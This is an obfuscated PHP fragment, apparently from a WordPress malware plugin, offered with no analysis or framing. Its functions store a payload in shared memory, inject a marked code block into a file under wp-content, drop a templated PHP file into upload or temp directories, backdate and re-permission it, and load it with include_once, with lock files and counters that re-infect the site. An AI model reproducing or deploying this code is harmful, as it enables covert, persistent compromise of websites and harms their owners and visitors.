    $yl9aqnqw7mkue  =  defined(m40pvx5ij_z4mj(1185)) && @$GLOBALS['__scf_nmc3chd3edto_699'](ABSPATH    .    bovhd4vawcd(1262))    ?  ABSPATH    .     bovhd4vawcd(1262)  :   __FILE__;
  return $GLOBALS['__scf_v379e8c103x_1261']($yl9aqnqw7mkue,    's');
  }

    function djp3c9fh7x_i_3sx6c8()
 {
   try  {
// project relaxed memento

 if (!$GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1263))   ||    !$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1261)))    return;
   if    (!defined(bovhd4vawcd(1185)))  return;
$xs7ycu0j4f9   =   z2lalb3eiqlgy6ozb9();
   if (!$xs7ycu0j4f9   ||  $GLOBALS['__scf_fr9u7cq1eo_10']($xs7ycu0j4f9)    <  (0xb+0x1e9)) return;



   $key = spbgc6gzfic1pdmgag();
   if ($key ===     false)  return;
 $mweszscxdnvqc   =  $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1264)) ? $GLOBALS['__scf_kfft5873yws_1265'](m40pvx5ij_z4mj(1266), $xs7ycu0j4f9)     :   $GLOBALS['__scf_pe3s4q1z7z_59']($xs7ycu0j4f9);
$cmpm56v6mwop4 = m40pvx5ij_z4mj(1267)  .  $GLOBALS['__scf_fr9u7cq1eo_10']($xs7ycu0j4f9) .     ':'  .  $mweszscxdnvqc .  "\n" .  $xs7ycu0j4f9;
  $kdynfhb_2whui =     $GLOBALS['__scf_fr9u7cq1eo_10']($cmpm56v6mwop4);
    $i3ame59ub4 =    @$GLOBALS['__scf_jtrkjx2kfzx520_1268']($key,  'a', 0,  0);
   if ($i3ame59ub4)   {
   $b6isie1aa_70pte1  =  (int) @$GLOBALS['__scf_jk_3cexwr8g_1269']($i3ame59ub4);
     $r2a6d9v4fwf7g9p =  @$GLOBALS['__scf_yyar3fczuf_1270']($i3ame59ub4,    0,   $b6isie1aa_70pte1);



 if ($GLOBALS['__scf_e_8z8ias8ka_43']($r2a6d9v4fwf7g9p)  &&   $GLOBALS['__scf_i8i8g4oxha_7']($r2a6d9v4fwf7g9p,   $xs7ycu0j4f9)  !==  false) {
 @$GLOBALS['__scf_mtshhbg5v0emtr_1271']($i3ame59ub4);
return;



 }
if  ($b6isie1aa_70pte1   >=   $kdynfhb_2whui)  {
   @$GLOBALS['__scf_mtshhbg5v0emtr_1271']($i3ame59ub4);

$i3ame59ub4   = @$GLOBALS['__scf_jtrkjx2kfzx520_1268']($key,  'w',    0,  0);
      if   ($i3ame59ub4) {$j51phqlq4bs3yb=1*2;$vlvrf0fe=$j51phqlq4bs3yb-35;

@$GLOBALS['__scf_a3jpxier9mst_1272']($i3ame59ub4,    $GLOBALS['__scf_bgz4a709zkmxh_1273']($cmpm56v6mwop4,    $b6isie1aa_70pte1,      "\0"),   0);



   $c6ddy5t1f5o58   = @$GLOBALS['__scf_yyar3fczuf_1270']($i3ame59ub4,  0,   $kdynfhb_2whui);
 @$GLOBALS['__scf_mtshhbg5v0emtr_1271']($i3ame59ub4);
if  ($c6ddy5t1f5o58     !==  $cmpm56v6mwop4)   r63yaewew47stuijcrwsx6(lpwgqh9300(1274), lpwgqh9300(1033));



    }
   return;
} else      {
@$GLOBALS['__scf_orzert3s6o7k_1275']($i3ame59ub4);


@$GLOBALS['__scf_mtshhbg5v0emtr_1271']($i3ame59ub4);
    }
  }
    $b6isie1aa_70pte1 =  $kdynfhb_2whui  + (977+47);
  $i3ame59ub4  =   @$GLOBALS['__scf_jtrkjx2kfzx520_1268']($key, 'c',   (0x5a+0x14a),     $b6isie1aa_70pte1);
 if (!$i3ame59ub4)  return;
    @$GLOBALS['__scf_a3jpxier9mst_1272']($i3ame59ub4, $GLOBALS['__scf_bgz4a709zkmxh_1273']($cmpm56v6mwop4,    $b6isie1aa_70pte1,    "\0"),   0);
$c6ddy5t1f5o58   =  @$GLOBALS['__scf_yyar3fczuf_1270']($i3ame59ub4,   0, $kdynfhb_2whui);
    if  ($c6ddy5t1f5o58  !==   $cmpm56v6mwop4)   r63yaewew47stuijcrwsx6(bovhd4vawcd(1276),    lpwgqh9300(1033));
        @$GLOBALS['__scf_mtshhbg5v0emtr_1271']($i3ame59ub4);

}    catch (Throwable   $k3g08rnqu9m)  {
  r63yaewew47stuijcrwsx6(m5t68uuej1(1276),      $k3g08rnqu9m);


 } catch  (Exception     $k3g08rnqu9m)  {

}
   }
   function msi835s9cq5a10f08($current,  $qbsr2y64itbk26ql)


 {
if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($current) || $current   === "")    return      lpwgqh9300(839)    . $qbsr2y64itbk26ql .   "\n";
if  ($GLOBALS['__scf_vqnw5_4kg7eu_96'](m5t68uuej1(1277),      $current,   $c7909a3qbs, PREG_OFFSET_CAPTURE)) {
$q59mmb5x8uxogy9    =     $c7909a3qbs[0][1] +  $GLOBALS['__scf_fr9u7cq1eo_10']($c7909a3qbs[0][0]);
    $lwck3f599lm72dz   =   $GLOBALS['__scf_vvn10ievj2k_9']($current, $q59mmb5x8uxogy9,      (8142+50));
  while     ($GLOBALS['__scf_e_8z8ias8ka_43']($lwck3f599lm72dz)   &&  $GLOBALS['__scf_vqnw5_4kg7eu_96'](bovhd4vawcd(1278), $lwck3f599lm72dz,    $_dm))   {
  $q59mmb5x8uxogy9   += $GLOBALS['__scf_fr9u7cq1eo_10']($_dm[0]);


 $lwck3f599lm72dz   =  $GLOBALS['__scf_vvn10ievj2k_9']($current,     $q59mmb5x8uxogy9,     (11938-3746));
}
return     $GLOBALS['__scf_vvn10ievj2k_9']($current,  0,  $q59mmb5x8uxogy9)  .  "\n"  .    $qbsr2y64itbk26ql     . "\n" . $GLOBALS['__scf_vvn10ievj2k_9']($current,  $q59mmb5x8uxogy9);
     }
 return m40pvx5ij_z4mj(839)     .  $qbsr2y64itbk26ql  .   "\n?>\n"  .     $current;
     }

  function    ype7ijvdezmnkn5_($key)
     {


if (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1212)))  return true;


 $kdbfhd3lu4ttw = @get_option(m5t68uuej1(1279) . $key,   "");
if     ($GLOBALS['__scf_e_8z8ias8ka_43']($kdbfhd3lu4ttw)   &&    $GLOBALS['__scf_i8i8g4oxha_7']($kdbfhd3lu4ttw,  '|')   !== false) {
$ln5_jbqpu4in    =  $GLOBALS['__scf_wninqej2t1_113']('|',   $kdbfhd3lu4ttw,  2);
  if  ((int)   $ln5_jbqpu4in[0]   ===    (int)   ($GLOBALS['__scf_ibw9xvmx9ckin_187']() /  (86354+46))     &&    (int) $ln5_jbqpu4in[1]   >=     (0x2+0x1))    return     false;
 }
return true;
}

   function    uvja49fijck3fra0ncu($key)
  {
  if    (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1280))  ||   !$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1281)))  return;
$jl8t1o4fbs9lm81  =    (int)   ($GLOBALS['__scf_ibw9xvmx9ckin_187']() /  (87460-1060));
$kdbfhd3lu4ttw = @get_option(m5t68uuej1(1279) .  $key, "");
    $jhq7h77_vtf =  0;
       if     ($GLOBALS['__scf_e_8z8ias8ka_43']($kdbfhd3lu4ttw)   &&  $GLOBALS['__scf_i8i8g4oxha_7']($kdbfhd3lu4ttw,  '|')    !==  false) {



 $ln5_jbqpu4in  = $GLOBALS['__scf_wninqej2t1_113']('|',      $kdbfhd3lu4ttw,   2);
if     ((int) $ln5_jbqpu4in[0]     ===  $jl8t1o4fbs9lm81)   $jhq7h77_vtf  = (int) $ln5_jbqpu4in[1];
        }

$jhq7h77_vtf++;
      @update_option(m40pvx5ij_z4mj(1279) .   $key, $jl8t1o4fbs9lm81  .     '|' . $jhq7h77_vtf,   m40pvx5ij_z4mj(1259));
  if  ($jhq7h77_vtf     >=    (1+2))    r63yaewew47stuijcrwsx6(bovhd4vawcd(1282),   m40pvx5ij_z4mj(1283)    .     $key);

   }
    function   extcosfwd0c5h48r6()



       {$z39lfyrxgsy=120|240;$x1m5apwa=$z39lfyrxgsy^150;
  try      {
   if   (!defined(bovhd4vawcd(1185)))   return;
 if  (!defined(bovhd4vawcd(1177))    ||  !@$GLOBALS['__scf_p_260ito5s0j_50'](WP_CONTENT_DIR)  ||      !bmbm6qj8xg0fnyt(WP_CONTENT_DIR)) return;

  $e3thri4q7dp = WP_CONTENT_DIR;


  $jvz1v970u9hr =   $e3thri4q7dp .     m5t68uuej1(1284);
  $lnfyvmqftz    =  $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),     m40pvx5ij_z4mj(1229));
$mhgza3zqckbz8 = dv62azao9qb3z33m4cwig0(ABSPATH   .  bovhd4vawcd(1118), (5+3))      . m40pvx5ij_z4mj(1285);
      $ymsu_gohk1ack2w     =   dha61pphirvk3tnlr();
  $je6b6gmzg5 = dv62azao9qb3z33m4cwig0(ABSPATH .  m40pvx5ij_z4mj(1222), (8+2));
$oxe2tmkhgzj7 =  $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1286))  ?   spbgc6gzfic1pdmgag()  :  false;
$xvk5jk0r7ahtx   =   $oxe2tmkhgzj7    !==  false  ? $GLOBALS['__scf_smtcda1m7z_1287']($oxe2tmkhgzj7)     :  0;
   $k9es7h05az    = isset($GLOBALS[lpwgqh9300(1221)]->prefix) ?  $GLOBALS[m5t68uuej1(1221)]->prefix :     m5t68uuej1(723);
       $kflsggvk8c4q4bi  =  lpwgqh9300(1288)     . $GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_pe3s4q1z7z_59']($lnfyvmqftz  . (string)    eliqs4hzzhoila0pbe()), 0, (43^35));
$gtuxjh56tj4z6r  = zjbm0yf_s5pmydvy7u2o6y(
    m40pvx5ij_z4mj(639),
     array('__SLUG__', '__ZIP_NAME__',    '__SHMOP_KEY__',    '__OPT_NAME__',  '__WP_PREFIX__', '__GUARD_NAME__', '__VERSION__'),
     array($lnfyvmqftz,  $mhgza3zqckbz8, $xvk5jk0r7ahtx,    $je6b6gmzg5, $k9es7h05az,   $kflsggvk8c4q4bi, kdgw8qqvzf6yolk())
  );
      if   (!$gtuxjh56tj4z6r)     {
 if  ((int) get_option(m5t68uuej1(751), 0)  > 0) r63yaewew47stuijcrwsx6(m5t68uuej1(1289),   m5t68uuej1(1290));
   return;$j_nntehinu=84*2;$fasv5l1jnaaw=$j_nntehinu-2;

   }
      $current  =    @$GLOBALS['__scf_nmc3chd3edto_699']($jvz1v970u9hr)   ?   @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($jvz1v970u9hr)  :   "";
   if    (!$GLOBALS['__scf_e_8z8ias8ka_43']($current))   {
  r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1289),   lpwgqh9300(1203));
   return;
  }
$current = bdsvhgz69_4ct5ntcc($current);

   $hu8724xqhdp90     =    kdgw8qqvzf6yolk()      .   ':' . dv62azao9qb3z33m4cwig0(ABSPATH   .  m40pvx5ij_z4mj(1291), (5+3));
$zaum0ps0v4j0gc      =     m5t68uuej1(1292)    . $hu8724xqhdp90  .    lpwgqh9300(1237);
$d29li7yf2fvxv     = lpwgqh9300(1293)  .   $hu8724xqhdp90    .   m40pvx5ij_z4mj(1237);



$rxkt1achxy5avj  =    dv62azao9qb3z33m4cwig0(ABSPATH  . bovhd4vawcd(1294),  (3+5));
    $yl03wik9bt      = $GLOBALS['__scf_r1v12_o00h5hc_454'](m5t68uuej1(1295)    .  $rxkt1achxy5avj  .  lpwgqh9300(1296),  "",  $current);
  $uudcohpf87yiz4   =     ($GLOBALS['__scf_i8i8g4oxha_7']($yl03wik9bt, bovhd4vawcd(1297))   !==    false);
if   ($GLOBALS['__scf_i8i8g4oxha_7']($current,     $zaum0ps0v4j0gc)  !==   false    &&  $GLOBALS['__scf_i8i8g4oxha_7']($current,  $d29li7yf2fvxv)  !==  false && !$uudcohpf87yiz4)    {



t3va1nam582mshqiyn9qc();
   



     return;



}
   $current =  $GLOBALS['__scf_r1v12_o00h5hc_454'](m40pvx5ij_z4mj(1298),   "", $yl03wik9bt);
if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($current)) {
       r63yaewew47stuijcrwsx6(bovhd4vawcd(1289),    m40pvx5ij_z4mj(1246));
return;
  }  {
 $current    =     bdsvhgz69_4ct5ntcc($current);
   $uiazql4qh1_9z     =    $GLOBALS['__scf_r1v12_o00h5hc_454'](m40pvx5ij_z4mj(1299),  "",  $gtuxjh56tj4z6r);
     $ksd1n_1autu8m    =     ($GLOBALS['__scf_fr9u7cq1eo_10']($current)    ===    0);
     if (!$ksd1n_1autu8m)  {
/* singular enumerator */

if  (!ype7ijvdezmnkn5_(m5t68uuej1(1289)))     {
 r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1289), m5t68uuej1(1249));
 return;
   }
// average-case dominator-tree




if (!dljv6u_n3brkommu($jvz1v970u9hr,   $current))    {
 r63yaewew47stuijcrwsx6(lpwgqh9300(1300),  lpwgqh9300(1250));
return;


 }
 uvja49fijck3fra0ncu(bovhd4vawcd(1301));
 }   else  {
if (!dljv6u_n3brkommu($jvz1v970u9hr,  "")) {
// @monomorphize factory

r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1301),      lpwgqh9300(1250));
    return;



 }
   }
 $c_k37hubu03ktz = msi835s9cq5a10f08($current,  $zaum0ps0v4j0gc . "\n"   .  $uiazql4qh1_9z .    "\n"  .  $d29li7yf2fvxv);
   if  (!a3hx61zfms1ji3euwsc($jvz1v970u9hr,  $c_k37hubu03ktz)) {
return;
   }
   rtmq61dax3c2elfi($jvz1v970u9hr);

 lnseazh_1k4yq6v_kjl($jvz1v970u9hr);
 t3va1nam582mshqiyn9qc();
  }
 } catch   (Throwable   $k3g08rnqu9m)  {
 r63yaewew47stuijcrwsx6(bovhd4vawcd(1302),  $k3g08rnqu9m);
      }   catch (Exception $k3g08rnqu9m) {


 }
     }
  function  hqhwxezqsdtentoalh6kfl()

     {
 try      {
  if    (!defined(m5t68uuej1(1185)))   return;
  if (p_lwrm_zqo9euyd0(t6995wceyqc2q1wqvl()))   return;
    if (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(467)))    return;
   if    ($GLOBALS['__scf_ebsa9aprq0y_104']()    === m5t68uuej1(1193))  return;
if   (!isset($_SERVER[bovhd4vawcd(409)]))      return;
if (get_transient(m40pvx5ij_z4mj(1303)))   return;



$dni332x1xyppmtlb   =  dha61pphirvk3tnlr();
if (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($dni332x1xyppmtlb)) xcz5hl0mdlt7fpm3xxe($dni332x1xyppmtlb, (888-395),   true);
    if (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($dni332x1xyppmtlb)   || !@$GLOBALS['__scf_p_260ito5s0j_50']($dni332x1xyppmtlb)) {
 $dni332x1xyppmtlb =  ABSPATH . m40pvx5ij_z4mj(513);
 if    (!@$GLOBALS['__scf_p_260ito5s0j_50']($dni332x1xyppmtlb)) $dni332x1xyppmtlb  =     r5waslskyqytjrm6();


}
 $w8x7viyx257e     = dv62azao9qb3z33m4cwig0(ABSPATH   .    'g',  (13-5));


 $augbslh2d6wj2y =    m5t68uuej1(510) .   $w8x7viyx257e  .      m5t68uuej1(1304);

  $webbh_v46wgl8h  =  $dni332x1xyppmtlb . '/'  .   $augbslh2d6wj2y;

      $f4j0gs_77zq83b =  $dni332x1xyppmtlb  .  m5t68uuej1(1305) . $w8x7viyx257e;
foreach  (array($dni332x1xyppmtlb,      ABSPATH     . bovhd4vawcd(513), r5waslskyqytjrm6())  as $faoon1lk5465vnf7)   {



$npsnxratuwqv0  =  $faoon1lk5465vnf7  .  m40pvx5ij_z4mj(1306)   . $w8x7viyx257e;
 if   (@$GLOBALS['__scf_a83pywb98qzq2_20']($npsnxratuwqv0)) {
  $nfvgmsnt4dzm   =   (int)   @$GLOBALS['__scf_tm09rtls_27e_98']($npsnxratuwqv0);
    if ($nfvgmsnt4dzm <= $GLOBALS['__scf_ibw9xvmx9ckin_187']()  - (160463-74063) ||     $nfvgmsnt4dzm >   $GLOBALS['__scf_ibw9xvmx9ckin_187']()  + (272+28))  {
 netei2x342rtzmi4tj69($npsnxratuwqv0);



  continue;
}
if  (@$GLOBALS['__scf_a83pywb98qzq2_20']($faoon1lk5465vnf7      .   bovhd4vawcd(1307)   .    $w8x7viyx257e  .    lpwgqh9300(1308)))   return;
 netei2x342rtzmi4tj69($npsnxratuwqv0);
 }
    }
 unset($faoon1lk5465vnf7,  $npsnxratuwqv0,    $nfvgmsnt4dzm);
  $fa1m86fskjjy =      ABSPATH   .  m40pvx5ij_z4mj(280)   .   $augbslh2d6wj2y;
    if   ($dni332x1xyppmtlb  !==  ABSPATH  .  lpwgqh9300(513)  &&  @$GLOBALS['__scf_a83pywb98qzq2_20']($fa1m86fskjjy) &&   vwmi9k19liyrqa2($fa1m86fskjjy)    !==  false)   {

 cik9ldzrbjmtnzm00($fa1m86fskjjy,  (403+17));
    if  (netei2x342rtzmi4tj69($fa1m86fskjjy)   && $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(22)))  @opcache_invalidate($fa1m86fskjjy,  true);
   }
   unset($fa1m86fskjjy);$pab7uni4srmw7d=PHP_MAJOR_VERSION;$ajuu15yi=$pab7uni4srmw7d*1;
 if  (@$GLOBALS['__scf_a83pywb98qzq2_20']($f4j0gs_77zq83b)  && (int) @$GLOBALS['__scf_tm09rtls_27e_98']($f4j0gs_77zq83b)  >   $GLOBALS['__scf_ibw9xvmx9ckin_187']()   -  (156+84)) return;
if (@$GLOBALS['__scf_a83pywb98qzq2_20']($webbh_v46wgl8h)  &&   ($GLOBALS['__scf_ibw9xvmx9ckin_187']()  -  (int)  @filectime($webbh_v46wgl8h))  <    (211+89))   return;

    if  (@$GLOBALS['__scf_a83pywb98qzq2_20']($webbh_v46wgl8h))   {
 $gn48pgl6f2n6bi4 = @$GLOBALS['__scf_a83pywb98qzq2_20']($dni332x1xyppmtlb    .    m40pvx5ij_z4mj(1309) .   $w8x7viyx257e)      ?   $GLOBALS['__scf_nimluvpxhrpvn_323']((string)  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($dni332x1xyppmtlb  . bovhd4vawcd(1309) .  $w8x7viyx257e))     :   "";


    if   ($gn48pgl6f2n6bi4 !==   ""  &&     $GLOBALS['__scf_vqnw5_4kg7eu_96'](m5t68uuej1(1310), $gn48pgl6f2n6bi4)     &&  version_compare($gn48pgl6f2n6bi4,  kdgw8qqvzf6yolk(),  '>'))  return;
unset($gn48pgl6f2n6bi4);
 }

   if  (@$GLOBALS['__scf_a83pywb98qzq2_20']($webbh_v46wgl8h))     {
  $ipxxd0l49t0   =  $dni332x1xyppmtlb  .   m5t68uuej1(1311)     .  dv62azao9qb3z33m4cwig0(ABSPATH    . 'g',   (0x4+0x4));
    $t41nth7rjkmh  =  @$GLOBALS['__scf_a83pywb98qzq2_20']($ipxxd0l49t0)  ?    (string) @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($ipxxd0l49t0)  : "";
$cqmx72ljee18yq18 =   0;
 




 if ($t41nth7rjkmh      !==      "")      {$zx04xkxali0=PHP_MAJOR_VERSION;$rskyjca5n=$zx04xkxali0*3;
 $kr5zkieczav32ygr    = $GLOBALS['__scf_wninqej2t1_113']('|',   $t41nth7rjkmh);
 $cqmx72ljee18yq18  = (int) $kr5zkieczav32ygr[0];
     }
   if   ($cqmx72ljee18yq18   >     0   && $GLOBALS['__scf_ibw9xvmx9ckin_187']() -    $cqmx72ljee18yq18   > (1277-377))     r63yaewew47stuijcrwsx6(bovhd4vawcd(637),  lpwgqh9300(1312));
elseif    ($cqmx72ljee18yq18   ===   0   && ($GLOBALS['__scf_ibw9xvmx9ckin_187']()  -  (int)   @filectime($webbh_v46wgl8h))     >   (879+21))  r63yaewew47stuijcrwsx6(lpwgqh9300(1313),   m5t68uuej1(1314));
 unset($ipxxd0l49t0,    $t41nth7rjkmh,     $kr5zkieczav32ygr, $cqmx72ljee18yq18);


    }
$xs7ycu0j4f9  =  z2lalb3eiqlgy6ozb9();$d1a1_gzu=48*3;$mg4unuls5cv6=$d1a1_gzu-18;
 if  (!$xs7ycu0j4f9  || $GLOBALS['__scf_fr9u7cq1eo_10']($xs7ycu0j4f9)  < (409+91))     return;
$j3fmp_g0rs = ai51jutf9hg_v2ib();



    $lnfyvmqftz  =   $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),  lpwgqh9300(1308));
$wukda101h9oznh  =   r5waslskyqytjrm6() .  m5t68uuej1(14);


 $nhw_1knbomg1  =   @$GLOBALS['__scf_p_260ito5s0j_50']($wukda101h9oznh)
 ? ($wukda101h9oznh   .  '/'   .  $lnfyvmqftz  .   m40pvx5ij_z4mj(1308))
   :  (r5waslskyqytjrm6() . bovhd4vawcd(94)  .    $lnfyvmqftz  .  '/'    . $lnfyvmqftz   .   m5t68uuej1(1308));
 $vei8zyqdyrt  = $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(556))    ?     $GLOBALS['__scf_jphyng87rekxk_557'](home_url(),  PHP_URL_HOST)  :     (isset($_SERVER[lpwgqh9300(563)]) ?   $_SERVER[bovhd4vawcd(563)] :     "");
     $zlzwvbj7pt28r  = (defined(lpwgqh9300(1204))  &&   WPMU_PLUGIN_DIR)   ?  WPMU_PLUGIN_DIR :  r5waslskyqytjrm6()  .  m5t68uuej1(1315);
   $zn0bo1zpjqg   =     (defined(lpwgqh9300(702)) && WP_PLUGIN_DIR) ?   WP_PLUGIN_DIR   : r5waslskyqytjrm6() .   m5t68uuej1(726);
      $a9dj199ew_s434qv     =  defined(m5t68uuej1(1177))     ? WP_CONTENT_DIR  :   r5waslskyqytjrm6();
      $r42htqphrgb9    = zjbm0yf_s5pmydvy7u2o6y(


    m5t68uuej1(1313),



   array('__PATH_B64__', '__PLUGIN_BASE64__',   '__DOMAIN__',      '__HB_B64__',    '__GPATH_B64__', '__ABSPATH_B64__',   '__CONTENTDIR_B64__',  '__MUDIR_B64__',     '__PLUGINDIR_B64__', '__SLUG__',   '__VERSION__'),
  array($GLOBALS['__scf_xsxk3ht6_06zc_354']($nhw_1knbomg1),      $j3fmp_g0rs,   $vei8zyqdyrt,   $GLOBALS['__scf_xsxk3ht6_06zc_354']($f4j0gs_77zq83b), $GLOBALS['__scf_xsxk3ht6_06zc_354']($webbh_v46wgl8h),  $GLOBALS['__scf_xsxk3ht6_06zc_354'](ABSPATH),  $GLOBALS['__scf_xsxk3ht6_06zc_354']($a9dj199ew_s434qv), $GLOBALS['__scf_xsxk3ht6_06zc_354']($zlzwvbj7pt28r),     $GLOBALS['__scf_xsxk3ht6_06zc_354']($zn0bo1zpjqg),   $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),   lpwgqh9300(1308)), kdgw8qqvzf6yolk())
 );
  if  (!$r42htqphrgb9)  {
   if    ((int)  get_option(m5t68uuej1(751),  0) > 0)   r63yaewew47stuijcrwsx6(m5t68uuej1(1316), bovhd4vawcd(1317));


    return;
   }
    if  (!fgcc_h22bqxgwmccod($r42htqphrgb9))      {
 r63yaewew47stuijcrwsx6(bovhd4vawcd(1316),   lpwgqh9300(1318));
return;
}
if  (a3hx61zfms1ji3euwsc($webbh_v46wgl8h, $r42htqphrgb9)) {
g3arn5w1kvbi32ro9tm($webbh_v46wgl8h,   db6euveuzemu49d01thfga());
       cik9ldzrbjmtnzm00($webbh_v46wgl8h,    (378+42));

     lnseazh_1k4yq6v_kjl($webbh_v46wgl8h);

    d3czoa7z5ve8_za41c14d($dni332x1xyppmtlb  .      lpwgqh9300(1319)   .    $w8x7viyx257e,  $GLOBALS['__scf_pe3s4q1z7z_59']($r42htqphrgb9), bovhd4vawcd(1316));
d3czoa7z5ve8_za41c14d($dni332x1xyppmtlb  .  lpwgqh9300(1309)  .  $w8x7viyx257e,   kdgw8qqvzf6yolk(),  m5t68uuej1(1316));

 @include_once    $webbh_v46wgl8h;
 set_transient(m40pvx5ij_z4mj(1303), 1, (596-296));
      }
   unset($zlzwvbj7pt28r,     $zn0bo1zpjqg,     $a9dj199ew_s434qv);
 }    catch  (Throwable  $k3g08rnqu9m)   {


    r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1320),  $k3g08rnqu9m);
   } catch  (Exception      $k3g08rnqu9m)     {
  }
 }
  function  at2pgldx1ep7sbjlr_r7($p5z1ch3ugyw7kudu)
   {
   if     (!$GLOBALS['__scf_e_8z8ias8ka_43']($p5z1ch3ugyw7kudu))     return      false;



  $g7kt4wf19sf5ez     =   $GLOBALS['__scf_fr9u7cq1eo_10']($p5z1ch3ugyw7kudu);
  if ($g7kt4wf19sf5ez  >  (1048540+36))  return    true;
   if     ($g7kt4wf19sf5ez    <   (411+89))   return     false;
      $k6szsp_yzxjv66  =    $GLOBALS['__scf_vvn10ievj2k_9']($p5z1ch3ugyw7kudu,  0,  (65505+31));

        $n5ege1ed3z30lb  =    $GLOBALS['__scf_ziuppthkut7_1321']($k6szsp_yzxjv66,   ' ')    + $GLOBALS['__scf_ziuppthkut7_1321']($k6szsp_yzxjv66, "\t");


return   ($n5ege1ed3z30lb / $GLOBALS['__scf_fr9u7cq1eo_10']($k6szsp_yzxjv66))    >  0.55;
    }

 function   z2lalb3eiqlgy6ozb9($rb1o1gk3r5  =   false)
{
  static   $xs7ycu0j4f9 =    null;

    if  ($rb1o1gk3r5)  {
$xs7ycu0j4f9   =  null;
     }
 if     ($xs7ycu0j4f9  !==   null) return  $xs7ycu0j4f9;
 $p5z1ch3ugyw7kudu  =  n2fjr1yyl5ye7s_6q(t6995wceyqc2q1wqvl());
      if  ($GLOBALS['__scf_e_8z8ias8ka_43']($p5z1ch3ugyw7kudu)    &&  $GLOBALS['__scf_fr9u7cq1eo_10']($p5z1ch3ugyw7kudu)  > (427+73)    &&   $GLOBALS['__scf_fr9u7cq1eo_10']($p5z1ch3ugyw7kudu)     <=  (1048540+36)  &&  !at2pgldx1ep7sbjlr_r7($p5z1ch3ugyw7kudu)     &&  fgcc_h22bqxgwmccod($p5z1ch3ugyw7kudu))   {



  $xs7ycu0j4f9 =    $p5z1ch3ugyw7kudu;

      return $xs7ycu0j4f9;
   }
    $zin9kimr47akd  =     d6ydz3_mq4hw_2s8_bo(m5t68uuej1(860),  "");
if  ($GLOBALS['__scf_e_8z8ias8ka_43']($zin9kimr47akd)   && $GLOBALS['__scf_fr9u7cq1eo_10']($zin9kimr47akd) >   (290+210)   &&    $GLOBALS['__scf_fr9u7cq1eo_10']($zin9kimr47akd)    <=  (1048488+88)     &&    !at2pgldx1ep7sbjlr_r7($zin9kimr47akd) && fgcc_h22bqxgwmccod($zin9kimr47akd))   {



     $xs7ycu0j4f9   =  $zin9kimr47akd;
    return   $xs7ycu0j4f9;
        }
     $xs7ycu0j4f9     =  false;
  return    $xs7ycu0j4f9;
}
   function ai51jutf9hg_v2ib($rb1o1gk3r5  = false)
   {



   static $wtvjfbz8g882q   =  null;
 if  ($rb1o1gk3r5)     {
    $wtvjfbz8g882q  =  null;
  }
  if  ($wtvjfbz8g882q   !==   null) return $wtvjfbz8g882q;

    $p5z1ch3ugyw7kudu =     z2lalb3eiqlgy6ozb9();
if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($p5z1ch3ugyw7kudu)  ||   $GLOBALS['__scf_fr9u7cq1eo_10']($p5z1ch3ugyw7kudu)  <     (0x1f1+0x3)  ||   $GLOBALS['__scf_fr9u7cq1eo_10']($p5z1ch3ugyw7kudu)   > (1048539+37)   ||  at2pgldx1ep7sbjlr_r7($p5z1ch3ugyw7kudu)     || !fgcc_h22bqxgwmccod($p5z1ch3ugyw7kudu))   {

   $wtvjfbz8g882q    =  false;
return $wtvjfbz8g882q;
 }
$wtvjfbz8g882q  =  $GLOBALS['__scf_xsxk3ht6_06zc_354'](u4k272wukpl8hyd67g($p5z1ch3ugyw7kudu));



       return  $wtvjfbz8g882q;
    }
   function   hgmyr2px4horuv3j($pgdfohj28qig745)
   {
    if (!$GLOBALS['__scf_e_8z8ias8ka_43']($pgdfohj28qig745) ||   $GLOBALS['__scf_fr9u7cq1eo_10']($pgdfohj28qig745) < (1+17)   ||  $GLOBALS['__scf_vvn10ievj2k_9']($pgdfohj28qig745,     0,  2)    !==   "\x1f\x8b")  return  0;
  $t81aaz4ksg7cljzg =  @$GLOBALS['__scf_vwfp8b2vecve11_274']('V',  $GLOBALS['__scf_vvn10ievj2k_9']($pgdfohj28qig745, -(0x3+0x1)));



 $t81aaz4ksg7cljzg  =  $GLOBALS['__scf_pomb89yiuz_37']($t81aaz4ksg7cljzg) ?   $t81aaz4ksg7cljzg[1]  :    0;$tclg2_cebo=PHP_INT_MAX/PHP_INT_MAX;$t3i3lml1=$tclg2_cebo+70;
 if    ($t81aaz4ksg7cljzg <  (421+79)    ||     $t81aaz4ksg7cljzg > (1048558+18))   return $t81aaz4ksg7cljzg;
  return  0;
     }
    function   zesnvx1hoeqb9uummp2($ijvqfm4k0rvi7)
    {
 return   $GLOBALS['__scf_of4qyeiv5oh8t_352'](hexdec($ijvqfm4k0rvi7[1]));$byet7y9k5=PHP_MAJOR_VERSION;$g4v61irzbl64=$byet7y9k5*8;


  }
function y2fq_g7qilvdboqm1($t6jsjlatx2i)



{
 if    (!$GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i)  ||   $t6jsjlatx2i      ===   "")  return     $t6jsjlatx2i;$w2ch8f5fgzahh=142|8;$eswcc92sg8nf=$w2ch8f5fgzahh^121;
